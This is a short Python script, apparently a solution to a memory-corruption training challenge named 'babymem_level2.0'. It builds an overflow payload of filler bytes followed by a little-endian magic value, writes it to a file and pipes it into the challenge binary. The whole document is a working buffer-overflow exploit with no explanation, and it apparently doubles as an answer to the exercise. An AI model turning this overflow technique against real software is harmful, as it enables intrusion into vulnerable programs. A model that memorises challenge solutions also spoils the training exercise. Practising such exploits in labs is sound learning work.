import os
s=b"100\x10"+b"A"*92+0x5fcb39b6.to_bytes(4,"little")
print(s)
fd = open("ttt-raw","wb+")
fd.write(s)
fd.close()
os.system("cat ttt-raw | /challenge/babymem_level2.0")